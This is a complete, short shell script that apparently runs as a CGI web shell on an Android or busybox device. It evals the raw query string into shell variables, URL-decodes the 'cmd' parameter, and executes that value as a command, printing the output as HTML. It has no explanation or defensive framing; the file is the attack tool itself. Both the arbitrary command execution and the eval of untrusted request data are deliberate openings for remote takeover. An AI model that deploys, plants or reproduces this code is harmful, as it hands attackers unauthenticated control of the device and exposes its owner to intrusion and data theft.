#!/system/bin/sh
echo "Content-type: text/html"
echo ""

eval $(echo "$QUERY_STRING"|/sbin/busybox awk -F'&' '{for(i=1;i<=NF;i++){print $i}}')
tmp=`/sbin/busybox httpd -d $cmd`
echo "<h1>$tmp</h1>"
echo "<pre>"
$tmp
echo "</pre>"
